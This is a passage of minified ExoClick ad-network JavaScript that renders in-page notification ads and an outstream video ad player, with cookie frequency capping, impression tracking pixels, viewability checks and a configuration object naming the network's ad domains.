          for (var p = t.parentElement.getElementsByClassName("second-notification"), r = 0; r < p.length; r++) p[r].classList.remove("second-notification");
          "function" == typeof f.processNextNotification && setTimeout(function () {
            f.notificationDisplayedCount--, f.processNextNotification(n);
          }, 1e3 * w);
        },
        T = 0,
        j = !1,
        D = o + _ + "-" + x;
      l && (T = i.getCookie(e + x), j = i.getCookie(D)), isNaN(T) && (T = 0), T = parseInt(T), y > 0 && T >= y || j || (h = 0 !== _ ? 0 : h, window.setTimeout(function () {
        !function () {
          if (0 === _) {
            var e = g.doc_reference.createElement("style"),
              o = {
                horizontalPositionCenterMarginLeft: "-" + p / 2 + "px;",
                verticalPositionMiddleMarginTop: "-" + r / 2 + "px;",
                secondNotificationVerticalPositionMiddleMarginTop: "-" + (s + a + r / 2) + "px;"
              },
              t = N;
            for (var n in o) if (Object.prototype.hasOwnProperty.call(o, n)) {
              var c = new RegExp("{{" + n + "}}", "g");
              t = t.replace(c, o[n]);
            }
            t = i.scrambleStyleString(t, m, /\.(exo-ipp[a-zA-Z\-_]+)/g), e.innerHTML = t, d.appendChild(e);
          }
        }();
        var o,
          n = g.doc_reference.createElement("div");
        n.setAttribute("id", i.getRandomizedReference("exo-ipp-" + x, m)), n.innerHTML = E, n.className = i.getRandomizedReference("exo-ipp", m), n.style.display = "none", d.appendChild(n), n.onclick = (o = f.url, function (e, t) {
          i.openLink(e, o), I(e, n, t);
        }), n.childNodes[0].childNodes[5].onclick = function (i) {
          I(i, n, _);
        }, n.style.removeProperty("display"), i.trackImpression(c.data.impression, c.idzone, void 0, !0), 0 === _ && (T += 1, l && i.setCookie(e + x, T, t)), ++_ < v && "function" == typeof f.processNextNotification && setTimeout(function () {
          f.processNextNotification(_);
        }, 1e3 * k);
      }, 1e3 * h));
    };
  }();
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("video-outstream", "content", function (t, a, n, o) {
        null != e && i(a, n, o), null === window.VastSupport && console.warn("VastSupport library is missing.");
      });
    } catch (e) {
      console.log("Outstream video renderer failed with error: " + e.message);
    }
    function i(i, t, a) {
      var n,
        o = t,
        r = o.className,
        s = "." + r,
        l = !1,
        c = 0,
        d = void 0,
        _ = void 0,
        p = void 0,
        u = void 0,
        m = void 0,
        g = void 0,
        v = void 0,
        f = isNaN(i.data.frequencyPeriod) ? 0 : i.data.frequencyPeriod,
        h = exoDynamicParams.zoneClosedCookiePrefix + i.idzone,
        x = isNaN(i.data.brandingEnabled) || i.data.brandingEnabled > 0 ? 1 : 0,
        w = void 0 !== i.data.cta && void 0 !== i.data.cta.displayUrl && "string" == typeof i.data.cta.displayUrl ? i.data.cta.displayUrl : "",
        y = void 0 !== i.data.cta && void 0 !== i.data.cta.text && "string" == typeof i.data.cta.text ? i.data.cta.text : "",
        b = void 0 !== i.data.url && "string" == typeof i.data.url ? i.data.url : "",
        k = isNaN(i.data.ctaEnabled) || i.data.ctaEnabled > 0,
        C = i.data.isVast,
        L = function (e) {
          if (C) {
            var a = [];
            for (var o in "undefined" !== i.data.tracking && (Array.isArray(i.data.tracking) && i.data.tracking.length > 0 || "object" == typeof i.data.tracking && Object.keys(i.data.tracking).length > 0) && (a = i.data.tracking), i.data = e, a) {
              var r = a[o];
              Object.prototype.hasOwnProperty.call(i.data.tracking, o) && r.length > 0 ? Array.prototype.push.apply(i.data.tracking[o], r) : r.length > 0 && (i.data.tracking[o] = r);
            }
          }
          void 0 === e && (e = null);
          var f = t,
            h = Y(),
            L = O(h);
          if (null !== e && void 0 !== e.videoCta && Object.prototype.hasOwnProperty.call(e.videoCta, "length") && e.videoCta.length > 0) for (var E = e.videoCta.length - 1; E >= 0; E--) {
            w = e.videoCta[E].displayUrl, y = e.videoCta[E].ctaText, b = e.videoCta[E].tracking;
            break;
          }
          d = Z(x, w, y, k), D(L, d), g = f.querySelector(s + ".exo_wrapper"), v = f.querySelector(s + "_close_text"), m = f.querySelector(s + "_video"), p = f.querySelector(s + "_close_x"), _ = f.querySelector(s + "_progress"), u = f.querySelector(s + "_replay_button"), n = f.querySelector(s + "_source"), f.querySelector(s + "_mute_button").addEventListener("click", function (e) {
            e.stopPropagation(), m.muted = !m.muted, S();
          });
          var T = i.data.video;
          if (x && exoDynamicParams.showBranding) {
            var P = f.querySelector(s + "_network_link");
            P.innerHTML = exoDynamicParams.brandingName, P.setAttribute("href", "http://" + exoDynamicParams.networkDomain), P.addEventListener("click", function (e) {
              e.stopImmediatePropagation();
            });
          }
          if (k) {
            var B = function (e) {
              window.open(b, "_blank"), e.stopImmediatePropagation();
            };
            if (f.querySelector(s + "_cta_wrapper").addEventListener("click", B), "" !== w) {
              var N = f.querySelector(s + "_display_url");
              N.innerHTML = w, N.addEventListener("click", B);
            }
            if ("" !== y) {
              var R = f.querySelector(s + "_cta_text");
              R.innerHTML = y, R.addEventListener("click", B);
            }
          }
          if (k || (f.querySelector(s + "_cta_wrapper").style.padding = "0px"), C) {
            if (!e || "linear" !== e.adType) return;
            T = e.mediaFile, e.mediaFileDetails && "streaming" === e.mediaFileDetails.delivery && VastSupport.VastStreaming.initialiseStreamers(e.mediaFileDetails.type, m, n);
          }
          F(i.data), A(z), g.addEventListener("click", function () {
            W(m) && (C ? (K([i.data.url]), window.open(e.clickthroughUrl), "undefined" !== e.clicktracking && K(e.clicktracking)) : window.open(i.data.url));
          }), J(M, h), n.setAttribute("src", T), m.muted = !0, S(), m.addEventListener("ended", function () {
            l = !1, c++, u.style.display = "block", u.addEventListener("click", V);
          }, !1), H(), m.addEventListener("timeupdate", function () {
            q(i.data, m.currentTime, m.duration);
            var e = m.currentTime / m.duration * 100;
            _.style.width = e + "%", 0 > m.currentTime && c < 1 ? (v.innerHTML = "Close ad in " + Math.ceil(0 - m.currentTime) + " sec", p.style.display = "none") : H();
          });
        },
        H = function () {
          var i = o.querySelector(s + "_close");
          v.innerHTML = "Close ad", p.style.display = "block", i.addEventListener("click", function (i) {
            if (i.stopPropagation(), a) {
              var t = "." + document.location.hostname,
                n = E(f);
              e.setCookie(h, !0, n, t);
            }
            m.pause(), l = !1, T();
          });
        },
        E = function (e) {
          return Math.floor(60 * e);
        },
        V = function (e) {
          e.stopPropagation(), _.classList.add("exo_notransition"), _.style.width = "0px", u.removeEventListener("click", V), u.style.display = "none", m.play().then(function () {
            l = !0, _.classList.remove("exo_notransition");
          });
        },
        z = function () {
          A() || !l ? A() && l && m.paused && m.play() : m.pause();
        },
        M = function () {
          if (l = !0, !(c >= 1)) {
            setTimeout(function () {
              g.classList.remove("exo_notransition"), d.style.right = 0;
            }, 100);
            var t,
              a,
              n = !C;
            if (C) for (a = 0; a < i.data.impression.length; a++) t = i.data.impression[a], e.trackImpression(t, i.idzone, void 0, n);else t = i.data.impression, e.trackImpression(t, i.idzone, void 0, n);
            if (void 0 !== i.data.tracking.impression) for (a = 0; a < i.data.tracking.impression.length; a++) void 0 !== i.data.tracking.impression[a] && e.trackImpression(i.data.tracking.impression[a].url, i.idzone, void 0, n);
            N() && R();
          }
        },
        S = function () {
          var e = o.querySelector(s + "_mute_on"),
            i = o.querySelector(s + "_mute_off");
          m.muted ? (e.style.display = "block", i.style.display = "none") : (e.style.display = "none", i.style.display = "block");
        },
        T = function () {
          g.classList.remove("exo_notransition"), G(d), setTimeout(function () {
            d.style.display = "none";
          }, 1e3);
        },
        F = function (e) {
          for (var i in e.stopTracking = [], e.tracking) {
            void 0 === e.tracking[i] && (e.tracking[i] = []), void 0 === e.stopTracking[i] && (e.stopTracking[i] = []);
            for (var t = 0; t < e.tracking[i].length; t++) e.stopTracking[i][t] = !1;
          }
        },
        q = function (e, i, t) {
          0 === (i = Math.floor(i)) && P(e, "start"), void 0 !== e.tracking.progress && e.tracking.progress.length && P(e, "progress", i), i == Math.floor(t / 4) && P(e, "firstQuartile"), i == Math.floor(t / 2) && P(e, "midpoint"), i == Math.floor(3 * t / 4) && P(e, "thirdQuartile"), i >= t - 1 && P(e, "complete");
        },
        P = function (t, a, n) {
          C ? function (t, a, n) {
            void 0 !== t.tracking[a] && t.tracking[a].forEach((o, r) => {
              !1 === o.stopTracking && o.elements.length ? function (e, i, t) {
                return "progress" !== e || "progress" === e && i === t;
              }(a, n, r) && (o.elements.forEach(t => {
                e.trackImpression(t, i.idzone, void 0, !1);
              }), o.stopTracking = !0) : B(t, a, n);
            });
          }(t, a, n) : B(t, a, n);
        },
        B = function (t, a, n) {
          if (void 0 !== i.data.tracking[a]) for (var o, r, s = (o = n, (r = new Date(1970, 0, 1)).setSeconds(o), r.toTimeString().substr(0, 8) + ".000"), l = 0; l < i.data.tracking[a].length; l++) {
            if (!1 === t.stopTracking[a][l]) {
              if ("progress" === a && void 0 !== i.data.tracking[a][l] && void 0 !== i.data.tracking[a][l].offset && s !== i.data.tracking[a][l].offset) continue;
              var c = "";
              null != i.data.tracking[a][l] && (void 0 !== i.data.tracking[a][l].url ? c = i.data.tracking[a][l].url : "string" == typeof i.data.tracking[a][l] && (c = i.data.tracking[a][l])), "" !== c && e.trackImpression(c, i.idzone, void 0, !0);
            }
            t.stopTracking[a][l] = !0;
          }
        },
        A = function () {
          var e,
            i,
            t = {
              hidden: "visibilitychange",
              webkitHidden: "webkitvisibilitychange",
              mozHidden: "mozvisibilitychange",
              msHidden: "msvisibilitychange"
            };
          for (e in t) if (e in document) {
            i = t[e];
            break;
          }
          return function (t) {
            return t && document.addEventListener(i, t), !document[e];
          };
        },
        N = function () {
          return navigator.userAgent.indexOf(" UCBrowser/") >= 0;
        },
        R = function () {
          o.querySelector(s).classList.contains("ucBrowser") || o.querySelector(s).classList.add("ucBrowser");
        },
        I = function (e, i) {
          for (var t in e) if (Object.prototype.hasOwnProperty.call(e, t)) {
            var a = new RegExp("{{" + t + "}}", "g");
            i = i.replace(a, e[t]);
          }
          return i;
        },
        O = function (e) {
          var i = document.createElement("style"),
            t = {
              main_el_class: r,
              screen_density: 0,
              density_width: 0,
              maximum_width: e
            };
          return i.innerHTML = I(t, "            .{{main_el_class}} {                display: block !important;            }            .{{main_el_class}}_network_link {                display: block;                color: rgb(255, 255, 255);                font-size: 12px;                font-family: Roboto, sans-serif, Verdana, Arial;                line-height: 20px;                padding: 0px 5px;                text-decoration: none;            }            .{{main_el_class}}_display_url, .{{main_el_class}}_cta_text {                font-size: 10px;                font-family: Roboto, sans-serif, Verdana, Arial;                text-decoration: none;            }            .{{main_el_class}}_cta_text {                text-transform: uppercase;                color: rgba(34, 33, 31, 1);                margin-right: 2px;                flex-shrink: 0;            }            .{{main_el_class}}_cta_text_link_icon {                flex: none;            }            .{{main_el_class}}_display_url {                color: rgba(236, 188, 27, 1);                display: flex;                align-items: center;                letter-spacing: 0.01em;                margin: 3px;                overflow: hidden;                white-space: nowrap;                text-overflow: ellipsis;                display: inline-block;            }            .{{main_el_class}}_exo_display_url_box:hover .{{main_el_class}}_display_url {                color: rgb(255, 205, 55) !important;            }            .{{main_el_class}}_display_url_ad_icon {                background: rgba(236, 188, 27, 1);                color: rgba(34, 33, 31, 1);                display: flex;                align-items: center;                display: flex;                flex-direction: column;                align-items: flex-start;                padding: 2px;                border-radius: 1px;            }            .{{main_el_class}}_exo_display_url_box:hover .{{main_el_class}}_display_url_ad_icon {                background: rgb(255, 205, 55);            }            .{{main_el_class}}_display_url_link_icon {                flex: none;            }            .{{main_el_class}}_exo_display_url_box:hover .{{main_el_class}}_display_url_link_icon path {                fill: rgb(255, 205, 55);            }            .{{main_el_class}}_effect {                -webkit-transition: all 1s ease-in-out;                -moz-transition: all 1s ease-in-out;                -ms-transition: all 1s ease-in-out;                -o-transition: all 1s ease-in-out;                transition: all 1s ease-in-out;                width: 100%;                position: relative;                height: 0;                max-height: 0;                overflow: hidden;            }            .{{main_el_class}}.exo_wrapper {                display: inline-block;                position: relative;                width: 100%;                height: 100%;                cursor: pointer;            }            .{{main_el_class}}_effect.exo_wrapper_show {                height: auto;                max-height: 1000px;            }            .{{main_el_class}} video {                width: 100%;                height: 100%;                display: block;                margin: 0px auto;            }            .{{main_el_class}}.ucBrowser {                z-index:99999999;            }            .{{main_el_class}}.ucBrowser .exo_close{                padding: 3px;                background: none;                top: -20px;            }            .{{main_el_class}}.ucBrowser .exo_link{                width: 100%;            }            .{{main_el_class}} .exo_link {                display: block;                color: rgb(255, 255, 255);                font-size: 12px;                font-family: Roboto, sans-serif, Verdana, Arial;                position: absolute;                left: 0px;                top: -20px;                height: 20px;                line-height: 20px;                padding: 0px 5px;                background: rgba(0, 0, 0, 0.7);                text-decoration: none;                z-index: 100;            }            .{{main_el_class}}_exo_link_box {                background: rgba(0, 0, 0, 0.7);                display: none;                 font-size: 12px;            }            .{{main_el_class}}_exo_cta_text_box, .{{main_el_class}}_exo_display_url_box {                display: flex;                align-items: center;                flex-direction: row;            }            .{{main_el_class}}_exo_display_url_box {                margin-right: 5px;                overflow: hidden;            }            .{{main_el_class}}_exo_cta_text_box {                background: rgba(236, 188, 27, 1) !important;                border-radius: 3px;                padding: 6px 10px;                justify-content: center;                flex-shrink: 0;            }            .{{main_el_class}}_exo_cta_text_box:hover {                background: rgb(255, 205, 55) !important;            }            .{{main_el_class}}_cta_wrapper {                background: rgba(34, 33, 31, 1);                padding: 10px;                cursor: pointer;                display: flex !important;                justify-content: space-between;                flex-direction: row;            }            .{{main_el_class}}_main_outstream:hover .{{main_el_class}}_cta_wrapper {                background-color: rgb(44, 44, 44);            }            .{{main_el_class}} .exo_close {                position: absolute;                border-radius: 50%;                padding: 5px;                user-select: none;                color: rgb(255, 255, 255);                right: 8px;                top: 8px;                background: rgba(0, 0, 0, 0.7);                cursor: pointer;                z-index: 9999;                opacity: 0.85;            }            .{{main_el_class}} .exo_close:hover {                opacity: 1;            }            .{{main_el_class}} .exo_close_show {                display: block;            }            .{{main_el_class}} .exo_close_text{                display: none;            }            .{{main_el_class}} .exo_close svg {                height: 24px;                width: 24px;                fill: #FFFFFF;                display: none;            }            .{{main_el_class}} .progress_exo_wrapper {                position: absolute;                width: calc(100% - 30px);                height: 3px;                left: 15px;                bottom: 15px;                background: rgba(255, 255, 255, 0.25);                z-index: 1;            }            .{{main_el_class}}_main_outstream .progress_exo_wrapper:hover {                background: rgba(255, 255, 255, 0.35);            }            .{{main_el_class}} .exo_progressbar {                width: 0%;                height: 100%;                background: rgba(249, 211, 0, 0.8);                transition: width 0.6s linear 0s;            }            .progress_exo_wrapper:hover .exo_progressbar {                background: rgb(255, 205, 55);            }            .{{main_el_class}}_replay_button {                top: 50%;                left: 50%;                transform: translate(-50%, -50%);                height: 70px;                width: 70px;                position: absolute;                border-radius: 50%;                background: rgba(0, 0, 0, 0.7);                display: none;            }            .{{main_el_class}}_mute_button {                border-radius: 5px;                position: absolute;                left: 15px;                bottom: 28px;                background: rgba(0, 0, 0, 0.7);                height: 30px;                width: 30px;                opacity: 0.85;            }            .{{main_el_class}}_mute_button:hover {                opacity: 1;            }            .{{main_el_class}}_mute_button svg {                position: absolute;                top: 50%;                left: 50%;                transform: translate(-50%, -50%);                fill: #FFFFFF;                height: 24px;                width: 24px;                display: none;            }            .{{main_el_class}}.exo_notransition, .{{main_el_class}} .exo_notransition {                -webkit-transition: none !important;                -moz-transition: none !important;                -o-transition: none !important;                transition: none !important;            }            .{{main_el_class}}_main_outstream {                max-width: {{maximum_width}};                min-width: 200px;            }            video::-webkit-media-controls-start-playback-button {                display: none !important;            }        "), i;
        },
        Z = function (e, i, t, a) {
          var n,
            o,
            s = {
              main_el_class: r
            };
          return s.branding = e ? I(s, '            <div class="{{main_el_class}}_exo_link_box">                <a class="{{main_el_class}}_network_link" target="_blank" href=""></a>            </div>        ') : "", s.displayUrl = a && i ? I(s, '            <div class="{{main_el_class}}_exo_display_url_box">                <svg class="{{main_el_class}}_display_url_ad_icon" width="10" height="8" viewBox="0 0 15 10" fill="none" xmlns="http://www.w3.org/2000/svg">                    <path d="M4.18945 1.60547L1.64062 9H0.0996094L3.31055 0.46875H4.29492L4.18945 1.60547ZM6.32227 9L3.76758 1.60547L3.65625 0.46875H4.64648L7.86914 9H6.32227ZM6.19922 5.83594V7.00195H1.55859V5.83594H6.19922ZM12.6708 7.6875V0H14.0887V9H12.8055L12.6708 7.6875ZM8.54578 5.90039V5.77734C8.54578 5.29688 8.60242 4.85938 8.7157 4.46484C8.82898 4.06641 8.99305 3.72461 9.20789 3.43945C9.42273 3.15039 9.68445 2.92969 9.99305 2.77734C10.3016 2.62109 10.6493 2.54297 11.036 2.54297C11.4188 2.54297 11.7548 2.61719 12.0438 2.76562C12.3329 2.91406 12.579 3.12695 12.7821 3.4043C12.9852 3.67773 13.1473 4.00586 13.2684 4.38867C13.3895 4.76758 13.4755 5.18945 13.5262 5.6543V6.04688C13.4755 6.5 13.3895 6.91406 13.2684 7.28906C13.1473 7.66406 12.9852 7.98828 12.7821 8.26172C12.579 8.53516 12.3309 8.74609 12.038 8.89453C11.7489 9.04297 11.411 9.11719 11.0243 9.11719C10.6415 9.11719 10.2958 9.03711 9.98719 8.87695C9.6825 8.7168 9.42273 8.49219 9.20789 8.20312C8.99305 7.91406 8.82898 7.57422 8.7157 7.18359C8.60242 6.78906 8.54578 6.36133 8.54578 5.90039ZM9.95789 5.77734V5.90039C9.95789 6.18945 9.98328 6.45898 10.0341 6.70898C10.0887 6.95898 10.1727 7.17969 10.286 7.37109C10.3993 7.55859 10.5458 7.70703 10.7255 7.81641C10.9091 7.92188 11.1278 7.97461 11.3817 7.97461C11.702 7.97461 11.9657 7.9043 12.1727 7.76367C12.3798 7.62305 12.5419 7.43359 12.6591 7.19531C12.7802 6.95312 12.8622 6.68359 12.9052 6.38672V5.32617C12.8817 5.0957 12.8329 4.88086 12.7587 4.68164C12.6884 4.48242 12.5927 4.30859 12.4716 4.16016C12.3505 4.00781 12.2001 3.89062 12.0204 3.80859C11.8446 3.72266 11.6356 3.67969 11.3934 3.67969C11.1356 3.67969 10.9169 3.73438 10.7372 3.84375C10.5575 3.95312 10.4091 4.10352 10.2919 4.29492C10.1786 4.48633 10.0946 4.70898 10.0399 4.96289C9.98523 5.2168 9.95789 5.48828 9.95789 5.77734Z" fill="#22211F"/>                </svg>                <span class="{{main_el_class}}_display_url"></span>                <svg class="{{main_el_class}}_display_url_link_icon" width="12" height="12" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">                    <g clip-path="url(#clip0_305_11)">                        <path d="M15.8333 15.8333H4.16667V4.16667H10V2.5H4.16667C3.24167 2.5 2.5 3.25 2.5 4.16667V15.8333C2.5 16.75 3.24167 17.5 4.16667 17.5H15.8333C16.75 17.5 17.5 16.75 17.5 15.8333V10H15.8333V15.8333ZM11.6667 2.5V4.16667H14.6583L6.46667 12.3583L7.64167 13.5333L15.8333 5.34167V8.33333H17.5V2.5H11.6667Z" fill="#ECBC1B"/>                    </g>                    <defs>                        <clipPath id="clip0_305_11">                            <rect width="20" height="20" fill="white"/>                        </clipPath>                    </defs>                </svg>            </div>        ') : "", s.ctaText = a && t ? I(s, '            <div class="{{main_el_class}}_exo_cta_text_box">                <span class="{{main_el_class}}_cta_text"></span>                <svg class="{{main_el_class}}_cta_text_link_icon" width="11" height="11" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">                    <g clip-path="url(#clip0_305_11)">                        <path d="M15.8333 15.8333H4.16667V4.16667H10V2.5H4.16667C3.24167 2.5 2.5 3.25 2.5 4.16667V15.8333C2.5 16.75 3.24167 17.5 4.16667 17.5H15.8333C16.75 17.5 17.5 16.75 17.5 15.8333V10H15.8333V15.8333ZM11.6667 2.5V4.16667H14.6583L6.46667 12.3583L7.64167 13.5333L15.8333 5.34167V8.33333H17.5V2.5H11.6667Z" fill="#22211F"/>                    </g>                    <defs>                        <clipPath id="clip0_305_11">                            <rect width="20" height="20" fill="white"/>                        </clipPath>                    </defs>                </svg>            </div>        ') : "", n = I(s, '            <div class="{{main_el_class}}_main_outstream">                {{branding}}                <div class="{{main_el_class}}_effect">                    <div class="{{main_el_class}} exo_wrapper">                        <video class="{{main_el_class}}_video" muted playsinline webkit-playsinline>                            <source class="{{main_el_class}}_source" src="">                        </video>                        <div class="{{main_el_class}}_close exo_close">                            <div class="{{main_el_class}}_close_text exo_close_text"></div>                            <svg class="{{main_el_class}}_close_x" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">                                <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>                                <path d="M0 0h24v24H0z" fill="none"/>                            </svg>                        </div>                        <div class="{{main_el_class}}_replay_button">                            <svg style="fill: #FFFFFF;" viewBox="4 4.5 27 27" xmlns="http://www.w3.org/2000/svg">                                <path d="M 18,11 V 7 l -5,5 5,5 v -4 c 3.3,0 6,2.7 6,6 0,3.3 -2.7,6 -6,6 -3.3,0 -6,-2.7 -6,-6 h -2 c 0,4.4 3.6,8 8,8 4.4,0 8,-3.6 8,-8 0,-4.4 -3.6,-8 -8,-8 z"/>                            </svg>                        </div>                        <div class="{{main_el_class}}_mute_button">                            <svg class="{{main_el_class}}_mute_off" viewBox="0 0 15 19" xmlns="http://www.w3.org/2000/svg">                                <path d="m0 5.5924v5.8152h3.7778l4.7222 4.8461v-15.507l-4.7222 4.8461h-3.7778zm12.75 2.9076c0-1.7155-0.9633-3.1887-2.3611-3.9059v7.8021c1.3978-0.7075 2.3611-2.1807 2.3611-3.8962zm-2.3611-8.5v1.9966c2.7294 0.83352 4.7222 3.431 4.7222 6.5034 0 3.0724-1.9928 5.6699-4.7222 6.5034v1.9966c3.7872-0.882 6.6111-4.3518 6.6111-8.5 0-4.1482-2.8239-7.618-6.6111-8.5z"/>                            </svg>                            <svg class="{{main_el_class}}_mute_on" viewBox="0 0 15 19" xmlns="http://www.w3.org/2000/svg">                                <path d="m12.75 8.5c0-1.6717-0.9633-3.1072-2.3611-3.8061v2.0872l2.3139 2.3139c0.0283-0.18889 0.0472-0.38722 0.0472-0.595zm2.3611 0c0 0.88778-0.1889 1.7189-0.51 2.4933l1.4261 1.4261c0.6234-1.1711 0.9728-2.5027 0.9728-3.9194 0-4.0422-2.8239-7.4233-6.6111-8.2828v1.9456c2.7294 0.81222 4.7222 3.3433 4.7222 6.3372zm-13.912-8.5l-1.1994 1.1994 4.4672 4.4672h-4.4672v5.6666h3.7778l4.7222 4.7223v-6.3562l4.0139 4.0139c-0.6328 0.4911-1.3411 0.8784-2.125 1.1145v1.9455c1.3033-0.2927 2.4839-0.8972 3.485-1.7094l1.9267 1.9361 1.1994-1.1994-8.5-8.5-7.3006-7.3006zm7.3006 0.94444l-1.9739 1.9739 1.9739 1.9739v-3.9478z"/>                            </svg>                        </div>                        <div class="progress_exo_wrapper">                            <div class="{{main_el_class}}_progress exo_progressbar"></div>                        </div>                    </div>                    <div class="{{main_el_class}}_cta_wrapper">                        {{displayUrl}}                        {{ctaText}}                    </div>                </div>            </div>        '), (o = document.createElement("div")).innerHTML = n.trim(), o.firstChild;
        },
        D = function (e, i) {
          t.appendChild(e), t.appendChild(i);
        },
        U = function () {
          return t.parentNode.offsetWidth >= 200 && window.innerWidth >= 200;
        },
        j = function () {
          var e = window.navigator.userAgent || "";
          return e.match(/iPad/i) || e.match(/iPhone/i);
        },
        W = function (e) {
          return j() && e.currentTime.toFixed(0) > 0 || !j();
        },
        Q = "100%",
        Y = function () {
          var e = i.data.maximumWidth;
          return isNaN(e) || e < 200 || e > 1080 ? Q : e + "px";
        },
        G = function (e) {
          e.style.display = "none";
        },
        J = function (e, i) {
          enableInlineVideo(m, {
            iPad: !0
          });
          var a = !0,
            n = !0,
            r = g.parentNode;
          function l() {
            return window.innerHeight + window.scrollY + 5 >= document.body.offsetHeight;
          }
          function c() {
            var e, a, p, u, v, f, h;
            if (!r.classList.contains("exo_wrapper_show") && U() && (a = i === Q ? t.offsetWidth : parseInt(i), p = Math.ceil(a * m.videoHeight / m.videoWidth / 2), u = Math.ceil(window.innerHeight || document.documentElement.clientHeight), v = Math.ceil(g.getBoundingClientRect().top), f = l() ? v : v + p, v > 0 && f < u) && n) {
              var x = l();
              if (r.classList.toggle("exo_wrapper_show"), (e = o.querySelector(s + "_exo_link_box")) && (e.style.display = "inline-block"), h = o.querySelector(s + "_cta_wrapper"), k && h && (h.style.display = "block"), k && !w && (h.style.justifyContent = "flex-end"), x) {
                var y = 0;
                setTimeout(function e() {
                  r.scrollIntoView(!1), y < 50 && (y++, setTimeout(e, 20));
                }, 20);
              }
              window.removeEventListener("resize", c), window.removeEventListener("scroll", c), window.removeEventListener("focus", d), window.removeEventListener("blur", _), document.removeEventListener("visibilitychange", d), window.instantiateViewability(m, .5, 0);
            }
          }
          function d() {
            (n = !n) && c();
          }
          function _() {
            n = !1;
          }
          m.addEventListener("viewable", function () {
            if (U() && !m.ended) {
              var i = m.play();
              void 0 === i || void 0 === i.then ? m.addEventListener("loadedmetadata", function () {
                a && (e(), a = !1);
              }) : i.then(function () {
                a && (e(), a = !1);
              }).catch(function () {
                j() && a && (a = !1, m.autoplay = !0, m.load(), e(), o.querySelector(s + "_close_x").style.display = "block");
              });
            }
          }), m.addEventListener("not-viewable", function () {
            m.pause();
          }), window.addEventListener("resize", c), window.addEventListener("scroll", c), window.addEventListener("focus", d), window.addEventListener("blur", _), document.addEventListener("visibilitychange", d), c();
        },
        K = function (e) {
          for (var i = 0; i < e.length; i++) new Image().src = e[i];
        };
      a && e.getCookie(h) || U() && (C ? VastSupport.VastResolver.processUrl(i.data.video, L) : L());
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.OutstreamVideoRenderer = {
      render: function (e, t, a) {
        RendererApi.validateRenderArguments(e, t, "video-outstream"), "boolean" != typeof a && (a = !1), i(e, t, a);
      }
    });
  }();
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => tracker.monitor());
  } else {
    tracker.monitor();
  }
})({
  "syndication": "syndication.realsrv.com",
  "network": "exoclick",
  "closeImg": "\/\/s3t3d2y8.afcdn.net\/images\/close-icon.svg",
  "closeImgCircle": "\/\/s3t3d2y8.afcdn.net\/images\/close-icon-circle.png",
  "asyncScriptInfoTag": "async||2",
  "tcfEnabled": true,
  "adsSubdomain": "a.realsrv.com",
  "networkDomain": "exoclick.com",
  "brandingName": "Ads by exoclick.com",
  "hash": "6a97888ec52c042c679a36e919843cca",
  "shortHash": "6a97888e",
  "showBranding": false,
  "zoneClosedCookiePrefix": "zone-closed-"
});